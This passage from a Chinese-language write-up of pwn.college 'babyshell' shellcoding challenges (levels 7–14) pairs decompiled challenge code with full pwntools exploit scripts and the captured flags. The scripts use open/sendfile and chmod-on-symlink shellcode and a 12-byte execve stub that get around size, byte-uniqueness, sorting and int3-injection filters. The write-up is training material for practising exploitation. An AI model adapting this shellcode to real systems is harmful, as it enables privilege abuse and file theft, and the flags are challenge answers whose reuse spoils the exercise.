  shellcode = mmap((void *)0x2483B000, 0x4000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)612610048 )
    __assert_fail("shellcode == (void *)0x2483b000", "/challenge/babyshell-level-7.c", 0x62u, "main");
  printf("Mapped 0x4000 bytes for shellcode at %p!\n", (const void *)0x2483B000);
  puts("Reading 0x4000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x4000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-7.c", 0x67u, "main");
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(byte_24A5);
  puts(
    "This challenge is about to close stdin, which means that it will be harder to pass in a stage-2 shellcode. You will need");
  puts("to figure an alternate solution (such as unpacking shellcode in memory) to get past complex filters.\n");
  if ( fclose(stdin) )
    __assert_fail("fclose(stdin) == 0", "/challenge/babyshell-level-7.c", 0x6Fu, "main");
  puts(
    "This challenge is about to close stderr, which means that you will not be able to use file descriptor 2 for output.\n");
  if ( fclose(stderr) )
    __assert_fail("fclose(stderr) == 0", "/challenge/babyshell-level-7.c", 0x72u, "main");
  puts(
    "This challenge is about to close stdout, which means that you will not be able to use file descriptor 1 for output. You");
  puts("will see no further output, and will need to figure out an alternate way of communicating data back to yourself.\n");
  if ( fclose(stdout) )
    __assert_fail("fclose(stdout) == 0", "/challenge/babyshell-level-7.c", 0x76u, "main");
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

~开玩笑，没有输入输出错误流还能困得住我不成 LOL~

请原谅我肚子饿了，实在懒得写思路了，现在只想快快恰饭，所以请师傅看 exp。

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, process, remote, shellcraft

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-7"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
        target.recvall(timeout=5)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = shellcraft.open("/flag")
    shellcode += """
    /* push out_fd */
    push rax
    """
    shellcode += shellcraft.open("./flag", "O_WRONLY | O_CREAT", 0o0644)
    shellcode += """
    /* sendfile('rax', '[rsp+8]', 0, 0x1000) */
    mov rdi, rax
    mov rsi, [rsp+0x8]
    xor rdx, rdx
    mov r10, 0x1000
    mov rax, SYS_sendfile
    syscall
    """
    shellcode += shellcraft.exit(0)

    return asm(shellcode)


def attack(target, payload):
    send_payload(target, payload)

    try:
        with open("./flag", "r") as file:
            content = file.read()

            log.success(content)
    except FileNotFoundError:
        log.error("The file './flag' does not exist.")
    except PermissionError:
        log.error("Permission denied to read './flag'.")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        attack(target, payload)
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

其实这题用 `chmod` 写起来更简单一点呢。

## Flag

Flag: `pwn.college{Y3UgyYnfUmoR24PWDDkCs1W8h92.01MyIDL5cTNxgzW}`

# Level 8

## Information

- Category: Pwn

## Description

> Write and execute shellcode to read the flag, but you only get 18 bytes.

## Write-up

```c ins={43-48} del={34, 39, 53} collapse={1-30}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+2Ch] [rbp-14h]
  const char **i; // [rsp+30h] [rbp-10h]
  const char **j; // [rsp+38h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x205B4000, 0x1000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)542851072 )
    __assert_fail("shellcode == (void *)0x205b4000", "/challenge/babyshell-level-8.c", 0x62u, "main");
  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x205B4000);
  puts("Reading 0x12 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x12uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-8.c", 0x67u, "main");
  puts("Removing write permissions from first 4096 bytes of shellcode.\n");
  if ( mprotect(shellcode, 0x1000uLL, 5) )
    __assert_fail(
      "mprotect(shellcode, 4096, PROT_READ|PROT_EXEC) == 0",
      "/challenge/babyshell-level-8.c",
      0x6Au,
      "main");
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_251D);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

这题在读取数据大小上做了限制，只允许读入 18 bytes。并且读完后把 `buf` 的写权限移除了，因此我们不能通过类似 `read` 的这种 shellcode 把再读数据到别的地方之类的。`execve` 肯定也不可能了，明显会超过 18 bytes。这时候我们发现 `chmod` 是一个很不错的候选，但是不能直接对 `/flag` 使用 `chmod`，不然还是会超。不过既然超的原因是文件名太长，那我们不妨试试建立一个名称短一点的软链接，对软链接进行操作。实测发现对软链接使用 `chmod` 会影响到源文件的权限。

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, os, process, remote, shellcraft

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-8"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
        target.recvall(timeout=5)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = shellcraft.chmod("f", 0o4)

    return asm(shellcode)


def attack(target, payload):
    os.system("ln -s /flag f")
    send_payload(target, payload)

    try:
        with open("./f", "r") as file:
            content = file.read()

            log.success(content)
    except FileNotFoundError:
        log.error("The file './f' does not exist.")
    except PermissionError:
        log.error("Permission denied to read './f'.")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        attack(target, payload)
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{swqZOtc9CdQUIFCMwrec4E5WBCi.0FNyIDL5cTNxgzW}`

# Level 9

## Information

- Category: Pwn

## Description

> Write and execute shellcode to read the flag, but your input has data inserted into it before being executed.

## Write-up

```c ins={44-48} del={40, 64} collapse={1-36, 52-60}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+28h] [rbp-18h]
  int k; // [rsp+2Ch] [rbp-14h]
  const char **i; // [rsp+30h] [rbp-10h]
  const char **j; // [rsp+38h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x2A207000, 0x1000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)706768896 )
    __assert_fail("shellcode == (void *)0x2a207000", "/challenge/babyshell-level-9.c", 0x62u, "main");
  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x2A207000);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-9.c", 0x67u, "main");
  puts("Executing filter...\n");
  for ( k = 0; k < (unsigned __int64)shellcode_size; ++k )
  {
    if ( k / 10 % 2 == 1 )
      *((_BYTE *)shellcode + k) = -52;
  }
  puts("This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an");
  puts(
    "instruction is an `INT 3`, which is an interrupt to call into the debugger. You must avoid these modifications in your");
  puts("shellcode.\n");
  puts("Removing write permissions from first 4096 bytes of shellcode.\n");
  if ( mprotect(shellcode, 0x1000uLL, 5) )
    __assert_fail(
      "mprotect(shellcode, 4096, PROT_READ|PROT_EXEC) == 0",
      "/challenge/babyshell-level-9.c",
      0x76u,
      "main");
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_2635);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

这题每隔 `0xa` 字节使用 `0xa` 个 `int3` 中断替换 `0xa` 字节的指令。简单吧，每隔 `0xa` 字节给它塞 `0xa` 个 `nop` 好了，随它换。在此之前使用一条 `jmp` 跳转到 `int3` 之后确保不被 `int3` 干扰，继续执行就好了。

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, os, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-9"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
        target.recvall(timeout=5)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = """
    /* chmod(file='f', mode=4) */
    /* push b'f\x00' */
    push 0x66
    mov rdi, rsp
    push 4
    pop rsi
    /* call chmod() */
    jmp continue
    .rept 0xa
        nop
    .endr
continue:
    push 90 /* 0x5a */
    pop rax
    syscall
    """

    return asm(shellcode)


def attack(target, payload):
    os.system("ln -s /flag f")
    send_payload(target, payload)

    try:
        with open("./f", "r") as file:
            content = file.read()

            log.success(content)
    except FileNotFoundError:
        log.error("The file './f' does not exist.")
    except PermissionError:
        log.error("Permission denied to read './f'.")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        attack(target, payload)
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{YzFX3cOrT5abYZfD8oqct1wr3xc.0VNyIDL5cTNxgzW}`

# Level 10

## Information

- Category: Pwn

## Description

> Write and execute shellcode to read the flag, but your input is sorted before being executed!

## Write-up

```c ins={48-61} del={44, 70} collapse={1-40, 65-66}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+28h] [rbp-38h]
  int k; // [rsp+2Ch] [rbp-34h]
  int m; // [rsp+30h] [rbp-30h]
  int v10; // [rsp+34h] [rbp-2Ch]
  const char **i; // [rsp+38h] [rbp-28h]
  const char **j; // [rsp+40h] [rbp-20h]
  _QWORD *v13; // [rsp+48h] [rbp-18h]
  __int64 v14; // [rsp+50h] [rbp-10h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x24AA2000, 0x1000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)615129088 )
    __assert_fail("shellcode == (void *)0x24aa2000", "/challenge/babyshell-level-10.c", 0x62u, "main");
  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x24AA2000);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-10.c", 0x67u, "main");
  puts("Executing filter...\n");
  v13 = shellcode;
  v10 = ((unsigned __int64)shellcode_size >> 3) - 1;
  for ( k = 0; k < v10; ++k )
  {
    for ( m = 0; m < v10 - k - 1; ++m )
    {
      if ( v13[m] > v13[m + 1] )
      {
        v14 = v13[m];
        v13[m] = v13[m + 1];
        v13[m + 1] = v14;
      }
    }
  }
  puts(
    "This challenge just sorted your shellcode using bubblesort. Keep in mind the impact of memory endianness on this sort");
  puts("(e.g., the LSB being the right-most byte).\n");
  printf("This sort processed your shellcode %d bytes at a time.\n", 8);
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_259D);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

如果你的 shellcode 足够长的话会对部分指令进行冒泡排序，但是如果比较短的话这个限制就形同虚设了。这里我直接用之前的 exp 了。

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, os, process, remote, shellcraft

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-10"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
        target.recvall(timeout=5)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = shellcraft.chmod("f", 0o4)

    return asm(shellcode)


def attack(target, payload):
    os.system("ln -s /flag f")
    send_payload(target, payload)

    try:
        with open("./f", "r") as file:
            content = file.read()

            log.success(content)
    except FileNotFoundError:
        log.error("The file './f' does not exist.")
    except PermissionError:
        log.error("Permission denied to read './f'.")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        attack(target, payload)
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{g5e9JB4cUp4THYN75FdmwWgVFA3.0lNyIDL5cTNxgzW}`

# Level 11

## Information

- Category: Pwn

## Description

> Write and execute shellcode to read the flag, but your input is sorted before being executed and stdin is closed.

## Write-up

```c ins={48-61, 72-73} del={44, 75} collapse={1-40, 65-68}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+28h] [rbp-38h]
  int k; // [rsp+2Ch] [rbp-34h]
  int m; // [rsp+30h] [rbp-30h]
  int v10; // [rsp+34h] [rbp-2Ch]
  const char **i; // [rsp+38h] [rbp-28h]
  const char **j; // [rsp+40h] [rbp-20h]
  _QWORD *v13; // [rsp+48h] [rbp-18h]
  __int64 v14; // [rsp+50h] [rbp-10h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x21A35000, 0x1000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)564350976 )
    __assert_fail("shellcode == (void *)0x21a35000", "/challenge/babyshell-level-11.c", 0x62u, "main");
  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x21A35000);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-11.c", 0x67u, "main");
  puts("Executing filter...\n");
  v13 = shellcode;
  v10 = ((unsigned __int64)shellcode_size >> 3) - 1;
  for ( k = 0; k < v10; ++k )
  {
    for ( m = 0; m < v10 - k - 1; ++m )
    {
      if ( v13[m] > v13[m + 1] )
      {
        v14 = v13[m];
        v13[m] = v13[m + 1];
        v13[m + 1] = v14;
      }
    }
  }
  puts(
    "This challenge just sorted your shellcode using bubblesort. Keep in mind the impact of memory endianness on this sort");
  puts("(e.g., the LSB being the right-most byte).\n");
  printf("This sort processed your shellcode %d bytes at a time.\n", 8);
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(byte_259D);
  puts(
    "This challenge is about to close stdin, which means that it will be harder to pass in a stage-2 shellcode. You will need");
  puts("to figure an alternate solution (such as unpacking shellcode in memory) to get past complex filters.\n");
  if ( fclose(stdin) )
    __assert_fail("fclose(stdin) == 0", "/challenge/babyshell-level-11.c", 0x7Fu, "main");
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

就算你把 `stdin` 也关了又如何，不还是无法阻止我使用之前的 exp 哈哈哈哈哈哈哈。

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, os, process, remote, shellcraft

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-11"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
        target.recvall(timeout=5)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = shellcraft.chmod("f", 0o4)

    return asm(shellcode)


def attack(target, payload):
    os.system("ln -s /flag f")
    send_payload(target, payload)

    try:
        with open("./f", "r") as file:
            content = file.read()

            log.success(content)
    except FileNotFoundError:
        log.error("The file './f' does not exist.")
    except PermissionError:
        log.error("Permission denied to read './f'.")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        attack(target, payload)
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{Ed61x95iAxED3sEmx4x19WauOCW.01NyIDL5cTNxgzW}`

# Level 12

## Information

- Category: Pwn

## Description

> Write and execute shellcode to read the flag, but every byte in your input must be unique.

## Write-up

```c ins={47-56} del={42, 61} collapse={1-38}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+28h] [rbp-128h]
  int k; // [rsp+2Ch] [rbp-124h]
  const char **i; // [rsp+30h] [rbp-120h]
  const char **j; // [rsp+38h] [rbp-118h]
  _QWORD v11[34]; // [rsp+40h] [rbp-110h] BYREF

  v11[33] = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x1C246000, 0x1000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)472145920 )
    __assert_fail("shellcode == (void *)0x1c246000", "/challenge/babyshell-level-12.c", 0x62u, "main");
  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x1C246000);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-12.c", 0x67u, "main");
  puts("Executing filter...\n");
  puts("This challenge requires that every byte in your shellcode is unique!\n");
  memset(v11, 0, 256);
  for ( k = 0; k < (unsigned __int64)shellcode_size; ++k )
  {
    if ( *((_BYTE *)v11 + *((unsigned __int8 *)shellcode + k)) )
    {
      printf("Failed filter at byte %d!\n", k);
      exit(1);
    }
    *((_BYTE *)v11 + *((unsigned __int8 *)shellcode + k)) = 1;
  }
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_2525);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

就你要每一个字节都得唯一是吧，`execve` 调用外部 shellcode 秒了！

`cdq` 是一字节指令，有时候用来取代 `xor edx, edx` 很不错。它的作用请参考 [CWD/CDQ/CQO — Convert Word to Doubleword/Convert Doubleword to Quadword](https://www.felixcloutier.com/x86/cwd:cdq:cqo).

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, pause, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-12"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = """
    /* execve(path='a', argv=0, envp=0) */
    /* push b'a\x00' */
    push 0x61
    mov rdi, rsp
    xor esi, esi
    cdq
    /* call execve() */
    mov al, 59 /* 0x3b */
    syscall
    """

    return asm(shellcode)


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=5)

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        if attack(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

我们的 shellcode 的目的就是加载外部脚本完成剩余攻击步骤。注意把下面脚本编译为 `a`（文件名）。

```c
#include <fcntl.h>
#include <sys/sendfile.h>

int main() {
  sendfile(1, open("/flag", O_RDONLY), 0, 0x1000);

  return 0;
}
```

## Flag

Flag: `pwn.college{g4UdtC88x4ayx2CjkFQNdxcSBsC.0FOyIDL5cTNxgzW}`

# Level 13

## Information

- Category: Pwn

## Description

> Write and execute shellcode to read the flag, but this time you only get 12 bytes!

## Write-up

```c del={39, 53} collapse={1-35, 43-49}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+2Ch] [rbp-14h]
  const char **i; // [rsp+30h] [rbp-10h]
  const char **j; // [rsp+38h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x2A318000, 0x1000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)707887104 )
    __assert_fail("shellcode == (void *)0x2a318000", "/challenge/babyshell-level-13.c", 0x62u, "main");
  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x2A318000);
  puts("Reading 0xc bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0xCuLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-13.c", 0x67u, "main");
  puts("Removing write permissions from first 4096 bytes of shellcode.\n");
  if ( mprotect(shellcode, 0x1000uLL, 5) )
    __assert_fail(
      "mprotect(shellcode, 4096, PROT_READ|PROT_EXEC) == 0",
      "/challenge/babyshell-level-13.c",
      0x6Au,
      "main");
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_251D);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

12 bytes 是吧，巧了，哥们上一个 exp 就压在 12 bytes 上了。

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, pause, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-13"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = """
    /* execve(path='a', argv=0, envp=0) */
    /* push b'a\x00' */
    push 0x61
    mov rdi, rsp
    xor esi, esi
    cdq
    /* call execve() */
    mov al, 59 /* 0x3b */
    syscall
    """

    return asm(shellcode)


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=5)

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        if attack(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{s_8hupYRZPagLrq6OX3Dd--4PYY.0VOyIDL5cTNxgzW}`

# Level 14

## Information

- Category: Pwn

## Description

> Write and execute shellcode to read the flag, but this time you only get 6 bytes :)

## Write-up

```c del={39, 46} collapse={1-35}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+2Ch] [rbp-14h]
  const char **i; // [rsp+30h] [rbp-10h]
  const char **j; // [rsp+38h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
